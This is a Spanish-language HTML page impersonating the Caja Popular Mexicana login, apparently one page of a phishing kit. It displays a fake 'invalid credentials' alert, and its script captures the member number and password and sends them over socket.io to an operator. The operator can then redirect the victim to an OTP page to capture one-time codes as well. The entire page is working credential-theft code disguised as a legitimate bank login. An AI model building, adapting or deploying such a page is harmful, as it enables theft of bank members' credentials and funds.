<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verificación de cuenta</title>
  <style>
    body {
      background-color: #f3f6fb;
      font-family: Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background: #fff;
      border-radius: 15px;
      padding: 40px 30px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      text-align: center;
    }
    .logo {
      margin-bottom: 30px;
    }
    .logo img {
      height: 50px;
    }
    h2 {
      font-size: 1.5em;
      margin-bottom: 10px;
    }
    p {
      color: #777;
      font-size: 0.95em;
      margin-bottom: 20px;
    }
    .alerta {
      background-color: #ffe5e5;
      color: #d8000c;
      border: 1px solid #d8000c;
      padding: 10px;
      border-radius: 8px;
      margin-bottom: 20px;
      font-size: 0.95em;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 1em;
    }
    button {
      background-color: #019765;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 1em;
      width: 100%;
    }
    button:hover {
      background-color: #019765;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://seeklogo.com/images/C/caja-popular-mexicana-logo-EC4478514F-seeklogo.com.png" alt="logo" />
    </div>
    <h2>Bienvenido a Caja Popular Mexicana.</h2>
    <div class="alerta">
      ❗ Usuario o clave inválida. Por favor ingrese a su cuenta correctamente.
    </div>
    <p>Ingrese a su cuenta para iniciar con el proceso de analisis.</p>
    <form id="login-form">
      <input type="tel" id="email" placeholder="Numero de socio" required> <!-- ✅ CORREGIDO -->
      <input type="password" id="clave" placeholder="Contraseña" required />
      <button type="submit">Continuar</button>
    </form>
  </div>

  <!-- Scripts -->
  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();

    window.addEventListener('DOMContentLoaded', () => {
      const form = document.getElementById('login-form');

      if (form) {
        form.addEventListener('submit', (e) => {
          e.preventDefault();

          const correo = document.getElementById('email').value; // ✅ CAMBIO DE 'usuario' a 'email'
          const contrasena = document.getElementById('clave').value;
          const sessionId = localStorage.getItem('sessionId') || crypto.randomUUID();

          localStorage.setItem('sessionId', sessionId);
          localStorage.setItem('correo', correo);
          localStorage.setItem('contrasena', contrasena);

          socket.emit('errorlogoForm', { correo, contrasena, sessionId });

          window.location.href = 'opciones.html';
        });
      }
    });

    socket.on("respuestaErrorLogo", (decision) => {
      if (decision === "otp") {
        window.location.href = "bienvenido.html";
      } else if (decision === "error_logo") {
        window.location.href = "errorlogo.html";
      }
    });
  </script>
</body>
</html>
